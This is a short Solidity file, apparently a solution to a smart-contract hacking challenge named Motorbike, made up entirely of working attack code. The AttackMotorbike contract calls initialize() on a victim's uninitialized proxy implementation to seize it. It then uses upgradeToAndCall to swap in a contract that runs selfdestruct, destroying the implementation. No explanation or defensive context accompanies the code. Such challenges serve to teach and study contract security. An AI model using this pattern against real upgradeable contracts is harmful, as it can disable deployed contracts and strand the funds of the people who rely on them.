pragma solidity ^0.8.10;

import "forge-std/Test.sol";

contract Destroy {
    function selfDestruct() external {
        selfdestruct(payable(tx.origin));
    }
}

contract AttackMotorbike{            
    address engineAddress;

    constructor (address _victim) payable {
        engineAddress = _victim;        
    }

    function attack() public {
        (bool success, ) = engineAddress.call(abi.encodeWithSignature("initialize()"));
        require(success, "engine could not be initialized");

        Destroy d = new Destroy();        
        bytes memory data = abi.encodeWithSignature("selfDestruct()");
        (bool success2, ) = engineAddress.call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)",address(d), data));
        require(success2, "upgrade to and call failed");
    }
}
